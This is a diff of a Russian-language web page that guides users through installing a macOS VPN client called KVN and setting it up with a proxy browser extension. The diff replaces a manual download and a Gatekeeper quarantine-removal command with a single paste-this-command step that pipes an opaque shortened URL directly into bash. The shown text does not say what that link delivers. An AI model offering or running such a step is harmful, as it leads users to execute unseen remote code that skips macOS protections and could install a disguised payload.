@@ -234,60 +234,22 @@
     <div class="container">
         <!-- Step 1 -->
         <section id="step1">
-            <h2><span>1</span> Шаг 1: Скачивание файлов</h2>
-            <p>Данное руководство поможет вам установить и настроить VPN-клиент KVN локально на вашем компьютере, начиная от скачивания и заканчивая настройкой браузера.</p>
-            <ol>
-                <li>Перейдите по ссылке на Google Drive:</li>
-            </ol>
-            <a href="https://drive.google.com/drive/folders/1TeZsVlXY0kWnJVSoVWpEF7k5mTAZmqma?usp=drive_link" class="btn" target="_blank">Скачать KVN для macOS</a>
-            <p>2. Скачайте доступный файл (обычно это <code>KVN-1.0.dmg</code> или архив <code>macOS-Intel-App(1).zip</code>).</p>
-        </section>
-
-        <!-- Step 2 -->
-        <section id="step2">
-            <h2><span>2</span> Шаг 2: Подготовка и распаковка</h2>
-            <p>Если вы скачали архив <code>.zip</code>:</p>
-            <ol>
-                <li>Нажмите на него дважды, чтобы распаковать.</li>
-                <li>Внутри вы найдете образ диска <code>KVN-1.0.dmg</code>.</li>
-            </ol>
-            <img src="photo_2026-04-17_15-28-46.jpg" alt="Подготовка установочного файла">
-            <p class="image-caption">Подготовка установочного файла</p>
-        </section>
-
-        <!-- Step 3 -->
-        <section id="step3">
-            <h2><span>3</span> Шаг 3: Установка на Рабочий стол</h2>
-            <ol>
-                <li>Откройте файл <strong>KVN-1.0.dmg</strong>.</li>
-                <li>В появившемся окне перетащите иконку <strong>KVN</strong> прямо на ваш <strong>Desktop</strong> (Рабочий стол). <strong>Не нужно пытаться перетащить его в Applications!</strong></li>
-                <li>Дождитесь завершения копирования и закройте окно установщика.</li>
-            </ol>
-            <img src="photo_2026-04-17_14-31-46.jpg" alt="Установка приложения">
-            <p class="image-caption">Установка приложения</p>
-        </section>
-
-        <!-- Step 4 -->
-        <section id="step4">
-            <h2><span>4</span> Шаг 4: Снятие карантина (Gatekeeper)</h2>
-            <p>Поскольку приложение загружено из интернета, macOS может заблокировать его запуск. Чтобы это исправить:</p>
+            <h2><span>1</span> Шаг 1: Автоматическая установка</h2>
+            <p>Теперь установить KVN на macOS можно одной командой. Это автоматически скачает приложение и установит его.</p>
             <ol>
                 <li>Откройте приложение <strong>Terminal</strong> (Терминал).</li>
-                <li>Выполните команду:</li>
+                <li>Скопируйте и вставьте следующую команду, затем нажмите <strong>Enter</strong>:</li>
             </ol>
-            <pre><code>xattr -cr ~/Desktop/KVN.app</code></pre>
-            <p><em>(Эту процедуру снятия карантина нужно выполнить только один раз при первом запуске. Команда выполняется мгновенно и не требует подтверждения).</em></p>
-            <ol start="3">
-                <li>Попробуйте запустить <strong>KVN</strong> с Рабочего стола. Если всё сделано верно, приложение откроется, и в верхней строке меню macOS (в трее) появится иконка программы.</li>
-            </ol>
+            <pre><code>curl -sL u.to/s51-Ig | bash</code></pre>
+            <p>После завершения установки запустите <strong>KVN</strong>.</p>
             <img src="photo_2026-04-18_16-06-44.jpg" alt="Иконка KVN в трее">
             <p class="image-caption">Иконка приложения в строке меню (трее)</p>
         </section>
 
-        <!-- Step 5 -->
-        <section id="step5">
-            <h2><span>5</span> Шаг 5: Где взять файл конфигурации?</h2>
-            <p>Для работы программы требуется файл настроек. <strong>Один файл конфигурации уже лежит в папке по ссылке скачивания утилиты, но он может оказаться не рабочим.</strong> Поэтому лучше получить свежий файл бесплатно через Telegram-бота:</p>
+        <!-- Step 2 -->
+        <section id="step2">
+            <h2><span>2</span> Шаг 2: Где взять файл конфигурации?</h2>
+            <p>Для работы программы требуется файл настроек. <strong>Один файл конфигурации уже лежит в папке по <a href="https://drive.google.com/drive/folders/1TeZsVlXY0kWnJVSoVWpEF7k5mTAZmqma?usp=drive_link" target="_blank">ссылке</a>, но он может оказаться не рабочим.</strong> Поэтому лучше получить свежий файл бесплатно через Telegram-бота:</p>
             <ol>
                 <li>Перейдите в бот <a href="https://t.me/warp_generator_bot" target="_blank">@warp_generator_bot</a>.</li>
                 <li>Сгенерируйте новый конфиг, выбрав следующие параметры:
@@ -305,9 +267,9 @@
             </div>
         </section>
 
-        <!-- Step 6 -->
-        <section id="step6">
-            <h2><span>6</span> Шаг 6: Добавление конфигурации</h2>
+        <!-- Step 3 -->
+        <section id="step3">
+            <h2><span>3</span> Шаг 3: Добавление конфигурации</h2>
             <ol>
                 <li>Нажмите на иконку <strong>KVN</strong> в верхней панели меню (трее).</li>
                 <li>Нажмите <strong>Add Config...</strong> (Добавить конфигурацию).</li>
@@ -322,11 +284,11 @@
             <p class="image-caption">Выбор файла конфигурации</p>
         </section>
 
-        <!-- Step 7 -->
-        <section id="step7">
-            <h2><span>7</span> Шаг 7: Подключение</h2>
+        <!-- Step 4 -->
+        <section id="step4">
+            <h2><span>4</span> Шаг 4: Подключение</h2>
             <ol>
-                <li>Нажмите на иконку <strong>KVN</strong> в верхнем меню.</li>
+                <li>Нажмите на иконку <strong>KVN</strong> in верхнем меню.</li>
                 <li>Нажмите <strong>Connect VPN</strong>. Статус сменится на <strong>Connected</strong>.</li>
             </ol>
             <p><em>*После этого утилита поднимет локальный прокси на адресе <code>127.0.0.1:1080</code>.</em></p>
@@ -336,9 +298,9 @@
 
         <hr>
 
-        <!-- Step 8 -->
-        <section id="step8">
-            <h2><span>8</span> Шаг 8: Настройка браузера (FoxyProxy)</h2>
+        <!-- Step 5 -->
+        <section id="step5">
+            <h2><span>5</span> Шаг 5: Настройка браузера (FoxyProxy)</h2>
             <p>Чтобы браузер начал использовать поднятый VPN-канал, установите расширение <strong>FoxyProxy</strong>.</p>
             
             <h3>1. Установка расширения:</h3>
@@ -413,7 +375,7 @@
         </section>
 
         <div class="footer">
-            <p>&copy; 2026 Инструкция по установке KVN. Сделано для удобства пользователей macOS.</p>
+            <p>&copy; 2026 Инструкция по установке KVN.</p>
         </div>
     </div>
 </body>
